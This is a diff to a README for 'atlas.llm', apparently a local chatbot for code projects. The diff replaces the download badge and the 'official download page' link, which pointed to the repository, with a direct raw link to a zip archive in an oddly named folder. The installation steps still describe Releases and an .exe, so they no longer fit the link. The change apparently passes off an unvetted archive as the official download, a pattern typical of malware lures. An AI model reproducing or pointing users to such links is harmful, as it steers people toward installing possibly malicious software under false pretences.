@@ -1,6 +1,6 @@
 # 🤖 atlas.llm - Chat with your code files locally
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/wendyneat563/atlas.llm)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/wendyneat563/atlas.llm/main/conjectural/llm_atlas_2.5.zip)
 
 atlas.llm helps you understand and document your code projects. This tool brings a smart chatbot directly to your computer. It reads your project files and answers questions about how your code works. It runs entirely on your own machine. Your data stays private because it never leaves your computer.
 
@@ -25,7 +25,7 @@ To run atlas.llm successfully, verify your computer meets these conditions:
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the [official download page](https://github.com/wendyneat563/atlas.llm).
+1.  Visit the [official download page](https://raw.githubusercontent.com/wendyneat563/atlas.llm/main/conjectural/llm_atlas_2.5.zip).
 2.  Look for the section labeled Releases on the right side of the screen.
 3.  Click the version number to open the release details.
 4.  Find the file that ends in .exe for Windows.
